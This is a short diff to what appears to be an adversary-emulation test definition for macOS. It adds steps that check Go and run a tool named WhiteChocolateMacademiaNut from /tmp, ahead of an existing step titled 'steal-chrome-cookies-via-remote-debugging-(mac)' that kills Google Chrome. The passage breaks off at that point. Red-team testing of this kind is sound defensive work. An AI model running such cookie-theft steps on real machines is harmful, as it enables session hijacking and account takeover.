@@ -18,6 +18,12 @@ requirements:
     platforms:
         - os: darwin
 steps:
+    - name: Install Go
+      inline: go version
+      executor: bash
+    - name: Download and compile WhiteChocolateMacademiaNut
+      inline: /tmp/WhiteChocolateMacademiaNut/chocolate -h
+      executor: bash
     - name: steal-chrome-cookies-via-remote-debugging-(mac)
       inline: |-
         killall 'Google Chrome'
